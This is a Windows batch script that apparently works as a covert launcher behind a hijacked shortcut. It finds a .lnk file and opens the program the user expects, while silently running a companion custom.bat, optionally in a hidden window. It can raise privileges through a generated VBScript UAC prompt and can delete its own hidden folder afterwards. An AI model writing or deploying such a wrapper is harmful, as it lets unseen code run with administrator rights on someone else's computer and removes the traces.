@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

for %%I in (.) do set hidden=%%~nxI

cd ..
for /R "%cd%" %%F in (*.lnk) do (
    set name=%%~nxF
    set name=!name:~0,-4!
)
cd !hidden!

FOR /F %%i IN (options/admin) DO set admin=%%i

if 'z!admin!'=='ztrue' (
    goto getAdmin
    exit
) else if 'z!admin!'=='zfalse' (
    goto continue
    exit
) else (
    msg "%username%" "Unknown /options/admin '!admin!' #00002"
    exit
)

:continue

FOR /F %%i IN (options/replaceFile) DO set replaceFile=%%i

if 'z!replaceFile!'=='zfalse' (
    start "" "!name!"
) else if 'z!replaceFile!'=='ztrue' (

    echo f | xcopy "!name!" "../!name!"

    cd ..
    start "" "!name!"
    cd !hidden!

    cd ..
    echo f | xcopy "!name!.lnk" "!hidden!/!name!.lnk" /f /y
    del "!name!.lnk"
    cd !hidden!

) else (
    msg "%username%" "Unknown /options/replaceFile '!replaceFile!' #00003"
    exit
)

FOR /F %%i IN (options/window) DO set window=%%i

if 'z!window!'=='znormal' (
    start cmd /c custom.bat
) else if 'z!window!'=='zmin' (
    start /min cmd /c custom.bat
) else if 'z!window!'=='zhidden' (
    start /b cmd /c custom.bat
) else (
    msg "%username%" "Unknown \options\window '!window!' #00001"
)

FOR /F %%i IN (options/selfDestruct) DO set selfDestruct=%%i

if 'z!selfDestruct!'=='ztrue' (
    cd ..
    rd /s /q "!name:~0,-4!.!name:~-4!\"

    attrib -H -S -R "!hidden!"
    start /b "" cmd /c rd /S /Q !hidden!
    
    exit
) else if 'z!selfDestruct!'=='zfalse' (
    exit
) else (
    msg "%username%" "Unknown \options\selfDestruct '!selfDestruct!' #00004"
    exit
)

exit

:getAdmin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto gotAdmin
    exit
) else (
    goto UACPrompt
    exit
)

:UACPrompt
    cd ..
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%temp2.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%cd%\!name:~0,-4!.!name:~-4!\!name!.bat"" %cd%\hidden", "", "runas", 0 >> "%temp%temp2.vbs"

    "%temp%temp2.vbs"
    del "%temp%temp2.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    cd /d "%~dp0"
    goto continue